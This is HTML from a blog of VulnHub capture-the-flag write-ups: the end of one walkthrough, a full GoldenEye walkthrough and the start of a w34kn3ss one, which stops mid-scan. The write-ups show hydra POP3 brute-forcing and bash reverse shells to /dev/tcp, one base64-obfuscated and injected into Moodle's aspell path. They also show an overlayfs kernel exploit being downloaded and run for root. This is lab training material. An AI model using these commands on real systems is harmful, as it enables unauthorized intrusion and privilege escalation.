To check <span class="k">for </span>new updates run: <span class="nb">sudo </span>apt update

Last login: Sat Jul 11 16:50:11 2020 from 192.168.128.1
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>
</code></pre></div></div>

<p>In the above output we see that the <strong>oscp</strong> user belogs to lxd group, we can exploit that to get root, but by listing the SUID binaries, I was able to detect the bash binary, this allows us to elevate our privileges in an easy way.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span>find / <span class="nt">-perm</span> <span class="nt">-u</span><span class="o">=</span>s <span class="nt">-type</span> f 2&gt;/dev/null
...
/usr/bin/bash
...
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="suid-binary">SUID Binary</h3>

<p>To get root, we just need to run the bash command with the -p option.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span>/usr/bin/bash <span class="nt">-p</span>
bash-5.0# <span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>oscp<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">egid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,4<span class="o">(</span>adm<span class="o">)</span>,24<span class="o">(</span>cdrom<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>,30<span class="o">(</span>dip<span class="o">)</span>,46<span class="o">(</span>plugdev<span class="o">)</span>,116<span class="o">(</span>lxd<span class="o">)</span>,1000<span class="o">(</span>oscp<span class="o">)</span>
bash-5.0# <span class="nb">cat </span>flag.txt 
d73b04b0e696b0945283defa3eee4538
</code></pre></div></div>

<h3 id="system-service">System Service</h3>

<p>Another way to get root, as we see In the oscp’s home directory there’s an ip script that performs a couple of tasks.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">ls
</span>ip  snap
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat </span>ip
<span class="c">#!/bin/sh</span>
<span class="nb">cp</span> /etc/issue-standard /etc/issue
/usr/local/bin/get-ip-address <span class="o">&gt;&gt;</span> /etc/issue
</code></pre></div></div>

<p>We search the path of this script in a file, it’s in the ip-update.service file, if we run this service the script will be executed.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">grep</span> <span class="nt">-r</span> <span class="s1">'/home/oscp/ip'</span> /etc 2&gt;/dev/null 
/etc/systemd/system/ip-update.service:ExecStart<span class="o">=</span>/home/oscp/ip
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">cat</span> /etc/systemd/system/ip-update.service
<span class="o">[</span>Unit]
<span class="nv">Description</span><span class="o">=</span>Write current ip addr to /etc/issue

<span class="o">[</span>Service]
<span class="nv">Type</span><span class="o">=</span>oneshot
<span class="nv">RemainAfterExit</span><span class="o">=</span><span class="nb">true
</span><span class="nv">ExecStart</span><span class="o">=</span>/home/oscp/ip

<span class="o">[</span>Install]
<span class="nv">WantedBy</span><span class="o">=</span>multi-user.target
</code></pre></div></div>

<p>With this in mind, I did a copy of the ip file, then I saved a bash reverse shell in that file, and gave it execute permissions.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">mv </span>ip ip.old
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'#!/bin/bash'</span> <span class="o">&gt;</span> ip
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> <span class="o">&gt;&gt;</span> ip
<span class="nt">-bash-5</span>.0<span class="nv">$ </span><span class="nb">chmod</span> +x ip
</code></pre></div></div>

<p>Then, I started a netcat listener, rebooted the machine and got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.157] 49772
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>758<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
root@oscp:/#
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - GoldenEye</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> It is a vulnerable machine has a good variety of techniques needed to get root, no exploit development/buffer overflows.</p>

<p><strong>Author:</strong> creosote</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root and capture the secret GoldenEye codes - flag.txt.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/goldeneye-1,240/">https://www.vulnhub.com/entry/goldeneye-1,240/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>I discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24 
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.156 00:0c:29:e1:fb:07       VMware, Inc.
192.168.179.254 00:50:56:fd:22:9e       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I did a full TCP port scan to discover for open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-vv</span> <span class="nt">-p-</span> <span class="nt">-T4</span> 192.168.179.156 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE REASON
25/tcp    open  smtp    syn-ack ttl 64
80/tcp    open  http    syn-ack ttl 64
55006/tcp open  unknown syn-ack ttl 64
55007/tcp open  unknown syn-ack ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>I performed service detection on open ports and script scanning on the target machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p25</span>,80,55006,55007 192.168.179.156 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE     VERSION
25/tcp    open  smtp        Postfix smtpd
|_smtp-commands: ubuntu, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>80/tcp    open  http        Apache httpd 2.4.7 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: GoldenEye Primary Admin Server
55006/tcp open  ssl/unknown
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Issuer: <span class="nv">commonName</span><span class="o">=</span>localhost/organizationName<span class="o">=</span>Dovecot mail server
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-04-24T03:23:52
| Not valid after:  2028-04-23T03:23:52
| MD5:   d039 2e71 c76a 2cb3 e694 ec40 7228 ec63
|_SHA-1: 9d6a 92eb 5f9f e9ba 6cbd dc93 55fa 5754 219b 0b77
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>55007/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: PIPELINING STLS USER RESP-CODES CAPA AUTH-RESP-CODE SASL<span class="o">(</span>PLAIN<span class="o">)</span> UIDL TOP
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>In the web service, I could see a directory path to login, but I don’t have the credentials, so I proceeded to look at the page source and found the terminal.js link, I clicked on it and this redirected me to a note with the encoded password of the user Boris, and a user named Natalya.</p>

<p><img src="/assets/images/goldeneye/screenshot-1.png" alt="" /></p>

<p><img src="/assets/images/goldeneye/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/goldeneye/screenshot-3.png" alt="" /></p>

<p>This string is HTML encoding, so I decoded it and got the password in plain text.</p>

<p><img src="/assets/images/goldeneye/screenshot-4.png" alt="" /></p>

<p>I proceeded to log in to the page as the Boris user.</p>

<p><img src="/assets/images/goldeneye/screenshot-5.png" alt="" /></p>

<p><img src="/assets/images/goldeneye/screenshot-6.png" alt="" /></p>

<p>When reviewing the page source the users Natalya and Boris were revealed.</p>

<p><img src="/assets/images/goldeneye/screenshot-7.png" alt="" /></p>

<h3 id="pop3-enumeration">POP3 Enumeration</h3>

<p>I proceeded to perform brute force the pop3 service with the Boris user but was unsuccessful, so I tried it with the Natalya user and found her password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-l</span> natalya <span class="nt">-P</span> /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 <span class="nt">-s</span> 55006  <span class="nt">-t</span> 50 <span class="nt">-S</span>
...
<span class="o">[</span>55006][pop3] host: 192.168.179.156   login: natalya   password: bird
...
</code></pre></div></div>

<p>Then I logged in to pop3 and found the xenia’s creds and a domain name that must be saved in the hosts file of the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.156:55006 <span class="nt">-crlf</span> <span class="nt">-quiet</span>
...
USER natalya
+OK
PASS bird
+OK Logged <span class="k">in</span><span class="nb">.</span>
list
+OK 2 messages:
1 631
2 1048
<span class="nb">.</span>
retr 2
+OK 1048 octets
Return-Path: &lt;root@ubuntu&gt;
X-Original-To: natalya
Delivered-To: natalya@ubuntu
Received: from root <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1]<span class="o">)</span>
        by ubuntu <span class="o">(</span>Postfix<span class="o">)</span> with SMTP <span class="nb">id </span>17C96454B1
        <span class="k">for</span> &lt;natalya&gt;<span class="p">;</span> Tue, 29 Apr 1995 20:19:42 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
Message-Id: &lt;20180425031956.17C96454B1@ubuntu&gt;
Date: Tue, 29 Apr 1995 20:19:42 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
From: root@ubuntu

Ok Natalyn I have a new student <span class="k">for </span>you. As this is a new system please <span class="nb">let </span>me or boris know <span class="k">if </span>you see any config issues, especially is it<span class="s1">'s related to security...even if it'</span>s not, just enter it <span class="k">in </span>under the guise of <span class="s2">"security"</span>...it<span class="s1">'ll get the change order escalated without much hassle :)

Ok, user creds are:

username: xenia
password: RCP90rulez!

Boris verified her as a valid contractor so just create the account ok?

And if you didn'</span>t have the URL on outr internal Domain: severnaya-station.com/gnocertdir
<span class="k">**</span>Make sure to edit your host file since you usually work remote off-network....

Since you<span class="s1">'re a Linux user just point this servers IP to severnaya-station.com in /etc/hosts.
</span></code></pre></div></div>

<p>I assigned the domain name to the hosts file of my system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'192.168.179.156 severnaya-station.com'</span> <span class="o">&gt;&gt;</span> /etc/hosts
</code></pre></div></div>

<p>I requested that domain name and this redirected me to a moodle platform.</p>

<p><img src="/assets/images/goldeneye/screenshot-8.png" alt="" /></p>

<p>I logged in as the xenia user.</p>

<p><img src="/assets/images/goldeneye/screenshot-9.png" alt="" /></p>

<p>As we see at the bottom of the page, we have a message from Dr Doak.</p>

<p><img src="/assets/images/goldeneye/screenshot-10.png" alt="" /></p>

<p>I clicked on <strong>Go to messages</strong>, it’s a welcome message for Xenia from Doak, he tells her that she can only communicate with him via email.</p>

<p><img src="/assets/images/goldeneye/screenshot-11.png" alt="" /></p>

<p>Then with the Doak user I brute force and found his password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>hydra <span class="nt">-l</span> doak <span class="nt">-P</span> /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt pop3://192.168.179.156 <span class="nt">-s</span> 55006  <span class="nt">-t</span> 50 <span class="nt">-S</span>
...
<span class="o">[</span>55006][pop3] host: 192.168.179.156   login: doak   password: goat
...
</code></pre></div></div>

<p>I logged in to the pop3 service and found his credentials for the moodle platform.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>openssl s_client <span class="nt">-connect</span> 192.168.179.156:55006 <span class="nt">-crlf</span> <span class="nt">-quiet</span>
...
USER doak
+OK
PASS goat
+OK Logged <span class="k">in</span><span class="nb">.</span>
list
+OK 1 messages:
1 606
<span class="nb">.</span>
retr 1
+OK 606 octets
Return-Path: &lt;doak@ubuntu&gt;
X-Original-To: doak
Delivered-To: doak@ubuntu
Received: from doak <span class="o">(</span>localhost <span class="o">[</span>127.0.0.1]<span class="o">)</span>
        by ubuntu <span class="o">(</span>Postfix<span class="o">)</span> with SMTP <span class="nb">id </span>97DC24549D
        <span class="k">for</span> &lt;doak&gt;<span class="p">;</span> Tue, 30 Apr 1995 20:47:24 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
Message-Id: &lt;20180425034731.97DC24549D@ubuntu&gt;
Date: Tue, 30 Apr 1995 20:47:24 <span class="nt">-0700</span> <span class="o">(</span>PDT<span class="o">)</span>
From: doak@ubuntu

James,
If you<span class="s1">'re reading this, congrats you'</span>ve gotten this far. You know how tradecraft works right?

Because I don<span class="s1">'t. Go to our training site and login to my account....dig until you can exfiltrate further information......

username: dr_doak
password: 4England!
</span></code></pre></div></div>

<p>I logged in to moodle as dr_doak.</p>

<p><img src="/assets/images/goldeneye/screenshot-12.png" alt="" /></p>

<p>In the following path I found the s3cret.txt file.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>My profile -&gt; My private files
</code></pre></div></div>

<p><img src="/assets/images/goldeneye/screenshot-13.png" alt="" /></p>

<p>I downloaded the s3cret.txt file, and the message let us know that the admin’s credentials was able to capture in plain text, and that juicy information is in a specified path.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">cat </span>s3cret.txt 
007,

I was able to capture this apps adm1n cr3ds through clear txt. 

Text throughout most web apps within the GoldenEye servers are scanned, so I cannot add the cr3dentials here. 

Something juicy is located here: /dir007key/for-007.jpg

Also as you may know, the RCP-90 is vastly superior to any other weapon and License to Kill is the only way to play.
</code></pre></div></div>

<p>This is an image, so I downloaded it to the attacking machine.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://severnaya-station.com/dir007key/for-007.jpg
</code></pre></div></div>

<p>I analized the exif data and found a base64 encoded string, filtered the string and decoded it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>exif <span class="k">for</span><span class="nt">-007</span>.jpg | <span class="nb">grep </span>Image | <span class="nb">awk</span> <span class="nt">-F</span> <span class="s2">"|"</span> <span class="s1">'{print $NF}'</span> | <span class="nb">base64</span> <span class="nt">-d</span>
xWinter1995x!
</code></pre></div></div>

<p>Then I logged in to moodle platform as admin user.</p>

<p><img src="/assets/images/goldeneye/screenshot-14.png" alt="" /></p>

<p><img src="/assets/images/goldeneye/screenshot-15.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="remote-command-execution">Remote Command Execution</h3>

<p>This version 2.2.3 of moodle allows an authenticated user to define spellcheck settings via the web interface. The user can update the spellcheck mechanism to point to a system-installed aspell binary. By updating the path for the spellchecker to an arbitrary command, an attacker can run arbitrary commands in the context of the web application upon spellchecking requests.</p>

<p>To exploit this, we need to locate ourselves in the following path:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Server -&gt; System paths
</code></pre></div></div>

<p>Then I base64 encoded the bash reverse shell to obfuscate it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'/bin/bash -c "/bin/bash -i &gt;&amp; /dev/tcp/192.168.179.1/443 0&gt;&amp;1"'</span> | <span class="nb">base64</span> | <span class="nb">tr</span> <span class="nt">-d</span> <span class="s1">'\n'</span>
L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK
</code></pre></div></div>

<p>In the <strong>Path to aspell</strong> box we enter the following instruction, and save the changes.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="si">$(</span><span class="nb">echo</span> <span class="s1">'L2Jpbi9iYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xNzkuMS80NDMgMD4mMSIK'</span> | <span class="nb">base64</span> <span class="nt">-d</span> | bash<span class="si">)</span>
</code></pre></div></div>

<p><img src="/assets/images/goldeneye/screenshot-16.png" alt="" /></p>

<p>Then, in the path:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Plugins -&gt; Text editors -&gt; TinyMCE HTML editor
</code></pre></div></div>

<p>At <strong>Spell engine</strong> we select <strong>PspellShell</strong> and save the changes.</p>

<p><img src="/assets/images/goldeneye/screenshot-17.png" alt="" /></p>

<p>And finally, in the path:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Site administration -&gt; Courses -&gt; Add/edit courses
</code></pre></div></div>

<p>Then, we click on <strong>Add a new course</strong>, before to execute the reverse shell we need set up a netcat listener and then click on <strong>Toggle spellchecker</strong>.</p>

<p><img src="/assets/images/goldeneye/screenshot-18.png" alt="" /></p>

<p>We got a shell, with the permissions that the moodle platform is running.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 443
listening on <span class="o">[</span>any] 443 ...
connect to <span class="o">[</span>192.168.179.1] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.156] 48348
bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1141<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
bash: no job control <span class="k">in </span>this shell
&lt;ditor/tinymce/tiny_mce/3.4.9/plugins/spellchecker<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>33<span class="o">(</span>www-data<span class="o">)</span>
</code></pre></div></div>

<p>Googling I found that this version of the kernel is vulnerable to the overlayfs exploit.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span><span class="nb">uname</span> <span class="nt">-a</span>
Linux ubuntu 3.13.0-32-generic <span class="c">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span>
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="kernel-exploit">Kernel Exploit</h3>

<p>The issue lies in the ovl_setattr function in fs/overlayfs/inode.c in the Linux kernel through 4.3.3 attempts to merge distinct setattr operations, which allows local users to bypass intended access restrictions and modify the attributes of arbitrary overlay files via a crafted application.</p>

<p>I downloaded the exploit to the attacking machine, in the exploit I modified gcc to cc since the gcc compiler doesn’t exist on the target machine, I compiled it and started the apache service, you can download the exploit <a href="https://www.exploit-db.com/exploits/37292">here</a>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget <span class="nt">--quiet</span> https://www.exploit-db.com/download/37292 <span class="nt">-O</span> ofs.c
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-i</span> <span class="s1">'s/gcc -/cc -/'</span> ofs.c
root@kali:~<span class="nv">$ </span>gcc ofs.c <span class="nt">-o</span> /var/www/html/ofs
root@kali:~<span class="nv">$ </span>systemctl start apache2
</code></pre></div></div>

<p>I transferred the exploit to the target machine, granted it execute privileges, ran it, and got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/dev/shm<span class="nv">$ </span>wget <span class="nt">-q</span> 192.168.179.1/ofs <span class="o">&amp;&amp;</span> <span class="nb">chmod</span> +x ofs <span class="o">&amp;&amp;</span> ./ofs
spawning threads
mount <span class="c">#1</span>
mount <span class="c">#2</span>
child threads <span class="k">done</span>
/etc/ld.so.preload created
creating shared library
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>,33<span class="o">(</span>www-data<span class="o">)</span>
<span class="c"># cat .flag.txt</span>
Alec told me to place the codes here: 

568628e0d993b1973adc718237da6e93

If you captured this make sure to go here.....
/006-final/xvf7-flag/
</code></pre></div></div>

<p><img src="/assets/images/goldeneye/screenshot-19.png" alt="" /></p>

  
    <h1 class="post-title">VulnHub - w34kn3ss</h1>
	<p class="post-date text-bold text-upcase">
	<span>October 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> This machine was made for Jordan’s Top hacker 2018 CTF, we tried to make it simulate a real world attacks “as much as possible” in order to improve your penetration testing skills.</p>

<p><strong>Author:</strong> askar</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/w34kn3ss-1,270/">https://www.vulnhub.com/entry/w34kn3ss-1,270/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With netdiscover I discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>netdiscover <span class="nt">-i</span> vmnet1 <span class="nt">-r</span> 192.168.179.1/24
Currently scanning: Finished!   |   Screen View: Unique Hosts

 5 Captured ARP Req/Rep packets, from 2 hosts.   Total size: 282
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 <span class="nt">-----------------------------------------------------------------------------</span>
 192.168.179.155 00:0c:29:47:ee:c9      4     240  VMware, Inc.
 192.168.179.254 00:50:56:e2:86:af      1      42  VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>Then I performed a full TCP/UDP scan to discover open ports.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.155:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.155:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.155/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
...
listener statistics 393590 packets recieved 0 packets droped and 0 interface drops
TCP open                     ssh[   22]         from 192.168.179.155  ttl 64 
TCP open                    http[   80]         from 192.168.179.155  ttl 64 
TCP open                   https[  443]         from 192.168.179.155  ttl 64
...
UDP open 192.168.179.155:35626  ttl 64
listener statistics 316 packets recieved 0 packets droped and 0 interface drops
UDP open                 unknown[33731]         from 192.168.179.155  ttl 64 
UDP open                 unknown[34201]         from 192.168.179.155  ttl 64 
UDP open                 unknown[35626]         from 192.168.179.155  ttl 64 
UDP open                 unknown[35798]         from 192.168.179.155  ttl 64 
UDP open                 unknown[36209]         from 192.168.179.155  ttl 64 
UDP open                 unknown[38441]         from 192.168.179.155  ttl 64 
UDP open                 unknown[38796]         from 192.168.179.155  ttl 64 
UDP open                 unknown[39640]         from 192.168.179.155  ttl 64 
UDP open                 unknown[46188]         from 192.168.179.155  ttl 64 
UDP open                 unknown[49120]         from 192.168.179.155  ttl 64 
UDP open                 unknown[50626]         from 192.168.179.155  ttl 64 
UDP open                 unknown[52569]         from 192.168.179.155  ttl 64 
UDP open                 unknown[59185]         from 192.168.179.155  ttl 64
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>I focused on performing the service enumeration of the open ports and escript scanning on the target.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-v</span> <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p22</span>,80,443 192.168.179.155 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT    STATE SERVICE  VERSION                                
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span> 
| ssh-hostkey:                                                     
|   2048 de:89:a2:de:45:e7:d6:3d:ef:e9:bd:b4:b6:68:ca:6d <span class="o">(</span>RSA<span class="o">)</span>  
|   256 1d:98:4a:db:a2:e0:cc:68:38:93:d0:52:2a:1a:aa:96 <span class="o">(</span>ECDSA<span class="o">)</span>  
|_  256 3d:8a:6b:92:0d:ba:37:82:9e:c3:27:18:b6:01:cd:98 <span class="o">(</span>ED25519<span class="o">)</span>
80/tcp  open  http     Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET POST
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Apache2 Ubuntu Default Page: It works
443/tcp open  ssl/http Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: 400 Bad Request
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>weakness.jth/organizationName<span class="o">=</span>weakness.jth/stateOrProvinceName<span class="o">=</span>Jordan/countryName<span class="o">=</span>jo
| Issuer: <span class="nv">commonName</span><span class="o">=</span>weakness.jth/organizationName<span class="o">=</span>weakness.jth/stateOrProvinceName<span class="o">=</span>Jordan/countryName<span class="o">=</span>jo
| Public Key <span class="nb">type</span>: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-05-05T11:12:54
| Not valid after:  2019-05-05T11:12:54
| MD5:   f921 c4be 2c6e 89d6 adaf a7c2 8f39 a87d
|_SHA-1: 0b44 5a28 c4da 0bf8 b308 a782 4081 1218 101e 0feb
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  http/1.1
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>I decided to interact with the web service but a first glance I couldn’t find anything.</p>

<p><img src="/assets/images/w34kn3ss/screenshot-1.png" alt="" /></p>

<p>So I run wfuzz to find hidden web directories.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-z</span> file,/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt http://192.168.179.155/FUZZ
...
000000032:   301        9 L      28 W       317 Ch      <span class="s2">"blog"</span>   
